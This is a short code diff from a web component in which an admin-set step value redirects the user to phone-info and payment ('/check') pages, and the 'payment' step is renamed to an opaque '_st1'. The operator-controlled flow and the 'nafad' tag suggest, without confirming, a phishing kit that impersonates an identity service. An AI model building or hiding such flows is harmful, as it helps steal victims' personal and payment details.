@@ -45,7 +45,7 @@ export default function Component() {
           } else if (data.currentStep === "phone") {
             console.log("[nafad] Admin redirecting to phone-info")
             window.location.href = "/phone-info"
-          } else if (data.currentStep === "payment") {
+          } else if (data.currentStep === "_st1") {
             console.log("[nafad] Admin redirecting to payment")
             window.location.href = "/check"
           } else if (data.currentStep === "_t2") {
